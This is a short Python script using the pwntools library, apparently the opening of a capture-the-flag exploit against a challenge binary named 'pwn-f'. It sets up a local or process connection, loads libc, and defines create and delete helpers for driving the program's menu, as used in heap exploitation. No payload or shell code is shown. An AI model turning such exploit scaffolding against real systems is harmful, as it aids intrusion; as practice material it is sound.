#!/usr/bin/env python
# -*- coding: utf-8 -*-
__Auther__ = 'M4x'

from pwn import *
from time import sleep
import sys
context.log_level = "debug"

if sys.argv[1] == "r":
    io = remote("127.0.0.1", 9999)
    elf = ELF("./pwn-f")
    libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")
else:
    io = process("./pwn-f")
    elf = ELF("./pwn-f")
    libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")

def create(size, val):
    io.sendlineafter("quit\n", "create ")
    io.sendlineafter("size:", str(size))
    io.sendlineafter("str:", val)

def delete(idx):
    io.sendlineafter("quit\n", "delete ")
    io.sendlineafter("id:", str(idx))
    io.sendlineafter("sure?:", "yes")

